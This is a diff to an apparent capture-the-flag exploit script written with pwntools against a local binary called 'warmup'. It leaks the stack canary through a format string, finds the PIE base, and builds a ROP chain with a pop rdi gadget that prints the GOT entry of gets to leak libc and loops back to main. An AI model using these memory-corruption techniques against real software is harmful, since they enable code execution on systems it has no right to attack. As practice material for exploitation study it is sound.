@@ -43,6 +43,7 @@ leakAddrStr=b"%20$p %23$p"
 # Starting ELF
 print("ESTABLISHING LIBC")
 libc = ELF("libc.so.6")
+elf = ELF("./warmup")
 
 # Start Process and send printf
 p = process("./warmup")
@@ -62,3 +63,22 @@ canary=p.recvuntil(b'\n')
 print("CANARY: ", canary)
 canaryInt=int(canary,16)
 
+# Find PIE Base, libc base in the binary
+PIEBase = GOTLeakInt - elf.sym["__libc_csu_init"]
+
+# POP RDI Gadget
+# Ran ROPgadget --binary warmup to find pop rdi
+popRdiRet = PIEBase + 0x0000000000001343 # : pop rdi ; ret
+
+# Craft ROP
+payload = padding
+payload += p64(canaryInt)
+payload += padOverBP
+payload += p64(popRdiRet)   # 
+payload += p64(PIEBase + elf.got["gets"])   # Cause next loop to get input
+payload += p64(PIEBase + elf.plt["puts"])   # Print out leak to find base of libc
+payload += p64(PIEBase + elf.symbols.main)  # Cause the infinite loop to happen
+
+# Send payload then recieve
+p.sendline(payload)
+print(p.recv())
